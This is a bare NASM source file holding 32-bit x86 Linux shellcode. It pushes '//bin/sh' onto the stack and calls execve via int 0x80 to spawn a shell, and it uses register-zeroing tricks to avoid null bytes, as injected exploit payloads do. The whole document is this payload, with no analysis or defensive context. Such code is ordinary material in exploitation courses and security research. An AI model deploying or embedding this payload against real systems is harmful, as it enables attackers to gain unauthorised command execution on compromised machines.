[BITS 32]

start:
	; path="//bin/sh", argv=NULL, envp=NULL
	xor ecx, ecx
	xor edx, edx
	push ecx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	
	; Do the execve() call
	xor eax, eax
	mov al, 11
	int 0x80
	jmp $
